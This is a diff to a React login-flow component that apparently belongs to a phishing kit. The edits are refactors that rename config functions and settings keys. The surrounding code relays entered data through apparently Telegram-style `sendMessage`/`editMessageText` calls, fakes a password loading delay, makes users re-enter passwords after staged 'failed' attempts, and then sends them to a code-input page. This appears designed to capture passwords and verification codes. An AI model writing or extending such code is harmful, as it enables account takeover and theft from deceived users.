@@ -1,7 +1,7 @@
 import HomeImage from '@assets/home-image.png';
 import LoadingModal from '@components/LoadingModal';
 import { editMessageText, sendMessage } from '@utils/api';
-import config from '@utils/config';
+import getConfig from '@utils/config';
 import getToday from '@utils/getToday';
 import React, { useEffect, useRef, useState } from 'react';
 import 'react-phone-input-2/lib/style.css';
@@ -53,8 +53,8 @@ const GetInfo: React.FC = () => {
 	const [loadingTime, setLoadingTime] = useState<number>(0);
 	useEffect(() => {
 		const configData = async () => {
-			const configData = await config();
-			setLoadingTime(configData.settings.password_loading_time);
+			const configData = await getConfig();
+			setLoadingTime(configData.settings.pass_loading_time);
 		};
 		configData();
 	}, []);
@@ -142,21 +142,18 @@ const GetInfo: React.FC = () => {
 					text: updatedMessage,
 				});
 			}
-			const configData = await config();
+			const configData = await getConfig();
 			setTimeout(async () => {
 				setIsLoading(false);
 				if (currentPath === '/live/home/login') {
-					if (
-						(await config()).settings
-							.max_failed_password_attempts === 0
-					) {
+					if (configData.settings.max_pass_attempts === 0) {
 						navigate('/live/code-input');
 					} else {
 						navigate('/live/home/confirm-password');
 					}
 				} else if (
 					failedPasswordAttempts ===
-					configData.settings.max_failed_password_attempts
+					configData.settings.max_pass_attempts
 				) {
 					navigate('/live/code-input');
 				} else {
